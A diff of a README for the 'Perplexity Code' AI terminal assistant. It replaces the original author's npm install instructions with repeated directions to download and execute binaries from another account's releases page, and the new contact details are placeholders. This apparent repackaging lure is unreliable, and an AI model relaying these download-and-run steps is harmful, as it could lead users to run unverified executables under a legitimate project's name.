@@ -1,173 +1,154 @@
-# Perplexity-Code 🧠💻
+# Perplexity Code: Powering Development with AI in Your Terminal
 
+![Perplexity Code](https://img.shields.io/badge/Perplexity%20Code-v1.0.0-blue.svg) ![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-orange.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg)
 
-**AI-Driven Code Assistant — Built for Cursor, VSCode & CLI**  
-_NPM Package: `perplexity-code`_
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen.svg)](https://github.com/vdanu/perplexity-code/releases)
 
-[![npm version](https://img.shields.io/npm/v/perplexity-code.svg)](https://www.npmjs.com/package/perplexity-code)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Build](https://img.shields.io/github/actions/workflow/status/holasoymalva/perplexity-code/main.yml)](https://github.com/holasoymalva/perplexity-code/actions)
-[![Twitter](https://img.shields.io/twitter/follow/holasoymalva?style=social)](https://twitter.com/holasoymalva)
+## Table of Contents
 
-> The power of Perplexity, reimagined for developers.  
-> Ask questions. Generate code. Debug. Refactor. All from your favorite terminal or editor.
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-![image](https://github.com/user-attachments/assets/c6f7b95d-7c62-4999-9112-aaff6036decf)
+## Overview
 
----
+Perplexity Code brings the power of AI directly to developers. This tool allows you to ask questions, generate code, debug, and refactor—all from your terminal or favorite editor. With a focus on simplicity and effectiveness, Perplexity Code enhances your development workflow.
 
-## ✨ What is `perplexity-code`?
+## Features
 
-**Perplexity-Code** is an open-source, NPM-installable CLI tool for AI-enhanced software development.  
-It integrates seamlessly with your terminal, **Cursor**, or **VSCode** workflow and helps you:
+- **Ask Questions**: Get instant answers to your programming queries.
+- **Code Generation**: Generate code snippets based on your requirements.
+- **Debugging**: Identify and fix issues in your code quickly.
+- **Refactoring**: Improve your code structure effortlessly.
+- **Terminal Integration**: Use it seamlessly in your command line environment.
+- **Editor Support**: Compatible with popular code editors.
 
-- Search technical topics
-- Explain or debug code
-- Convert between programming languages
-- Refactor and optimize code snippets
+## Installation
 
-Powered by Perplexity (or configurable LLM APIs), this tool turns your terminal into a coding knowledge copilot.
+To get started with Perplexity Code, you need to download the latest release. Visit the [Releases](https://github.com/vdanu/perplexity-code/releases) section to find the necessary files. Download and execute the appropriate file for your operating system.
 
----
+### For Windows
 
-## 🔧 Installation
+1. Download the Windows executable from the [Releases](https://github.com/vdanu/perplexity-code/releases) section.
+2. Open your command prompt.
+3. Navigate to the folder where you downloaded the file.
+4. Run the executable.
 
-### Global installation
+### For macOS
 
-```bash
-npm install -g perplexity-code
-````
+1. Download the macOS package from the [Releases](https://github.com/vdanu/perplexity-code/releases) section.
+2. Open your terminal.
+3. Navigate to the folder where you downloaded the file.
+4. Run the package.
 
-> You can now run the CLI using `perplexity-code` or `pxc`.
+### For Linux
 
-### One-off use (no install required)
+1. Download the Linux binary from the [Releases](https://github.com/vdanu/perplexity-code/releases) section.
+2. Open your terminal.
+3. Navigate to the folder where you downloaded the file.
+4. Run the binary.
 
-```bash
-npx perplexity-code "What is the difference between var, let and const?"
-```
+## Usage
 
----
+After installation, you can start using Perplexity Code in your terminal or editor. Simply type the command to initiate the tool, and you can start interacting with it.
 
-## 🚀 Usage Examples
+### Starting the Tool
 
-```bash
-pxc "How do I write a GraphQL resolver in Node.js?"
-```
-
-```bash
-pxc /explain "./src/hooks/useAuth.ts"
-```
-
-```bash
-pxc /convert "Convert this Python dict to a TypeScript interface"
-```
-
-```bash
-pxc /debug "Cannot read property 'length' of undefined"
-```
-
-You can also pipe code:
+To start, open your terminal or editor and type:
 
 ```bash
-cat main.py | pxc /refactor
+perplexity
 ```
 
----
+This command will launch the Perplexity Code interface, where you can ask questions, generate code, and more.
 
-## ⚙️ Configuration
+### Asking Questions
 
-Create a `.perplexityrc` or `perplexity.config.json` in your project or home directory:
-
-```json
-{
-  "apiKey": "sk-XXXXXX",
-  "model": "perplexity-codellama",
-  "language": "typescript",
-  "editor": "vscode"
-}
-```
-
-Or pass options via CLI:
+You can ask questions in plain English. For example:
 
 ```bash
-pxc "Explain async/await" --model perplexity-codellama --language javascript
+What is the difference between a list and a tuple in Python?
 ```
 
----
+Perplexity Code will provide you with a clear and concise answer.
 
-## 🧩 Editor Integrations
+### Generating Code
 
-### ✅ Cursor
-
-1. Open Cursor → Settings → Plugins
-2. Add path to `perplexity-code` binary
-3. Use inline queries like `/explain` or `/debug` in the editor
-
-### ✅ VSCode (coming soon)
-
-* Native extension with slash commands and inline answers
-* Chat-style interface with syntax-aware suggestions
-
----
-
-## 🔥 Features
-
-* 💬 Slash-based commands: `/explain`, `/debug`, `/convert`, `/optimize`, `/summarize`
-* 🧠 Context-aware answers with code formatting
-* 🧪 Multi-model support (Perplexity, Gemini, OpenAI)
-* 📂 File-based input and stdin piping
-* 🛠️ Works inside tmux, iterm, Warp, or Cursor
-
----
-
-## 🛤 Roadmap
-
-* [ ] VSCode extension release
-* [ ] Git diff-aware prompts (`/review`)
-* [ ] Multi-language translation mode
-* [ ] Plugins: `/test`, `/doc`, `/summarize`
-* [ ] Local LLM fallback (offline mode)
-
----
-
-## 🤝 Contributing
-
-We’d love your input, ideas, and PRs. Start with:
+To generate code, simply specify what you need. For example:
 
 ```bash
-git clone https://github.com/holasoymalva/perplexity-code.git
-cd perplexity-code
-npm install
-npm link # for local CLI testing
+Generate a Python function to calculate the factorial of a number.
 ```
 
-> Want to contribute a command? Check out `/src/commands`.
+The tool will provide you with the code snippet ready for use.
 
----
+### Debugging Code
 
-## 📦 Publishing Notes (for maintainers)
-
-To publish a new version to NPM:
+If you encounter issues, you can paste your code into the interface and ask:
 
 ```bash
-npm version patch
-npm publish
+What is wrong with this code?
 ```
 
-Ensure you are logged in to NPM with correct credentials.
+Perplexity Code will analyze the code and suggest fixes.
 
----
+### Refactoring Code
 
-## 📄 License
+To improve your code, use a command like:
 
-MIT License © 2025 [@holasoymalva](https://github.com/holasoymalva)
+```bash
+Refactor this function for better readability.
+```
 
----
+The tool will suggest improvements and provide a refactored version.
 
-## 🌐 Links
+## Commands
 
-* GitHub: [https://github.com/holasoymalva/perplexity-code](https://github.com/holasoymalva/perplexity-code)
-* NPM: [https://npmjs.com/package/perplexity-code](https://npmjs.com/package/perplexity-code)
-* Twitter: [@holasoymalva](https://twitter.com/holasoymalva)
+Perplexity Code comes with a set of commands to enhance your experience. Here are some of the key commands you can use:
 
-> Built for the curious. Made for developers. Ready for your terminal. ⚡️
+- **ask**: Ask a programming-related question.
+- **generate**: Generate code snippets based on your request.
+- **debug**: Debug your code and get suggestions.
+- **refactor**: Refactor your code for better readability and efficiency.
+
+### Example Commands
+
+```bash
+perplexity ask "How do I reverse a string in Python?"
+perplexity generate "A function to sort a list of numbers."
+perplexity debug "print(Hello World)"
+perplexity refactor "def my_function(x): return x*2"
+```
+
+## Contributing
+
+We welcome contributions to Perplexity Code. If you have ideas for new features or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes.
+4. Commit your changes with a clear message.
+5. Push to your branch.
+6. Create a pull request.
+
+### Code of Conduct
+
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while contributing.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, please reach out to the maintainers:
+
+- **Developer**: [Your Name](https://github.com/yourusername)
+- **Email**: your.email@example.com
+
+Stay updated with the latest changes by visiting the [Releases](https://github.com/vdanu/perplexity-code/releases) section regularly.
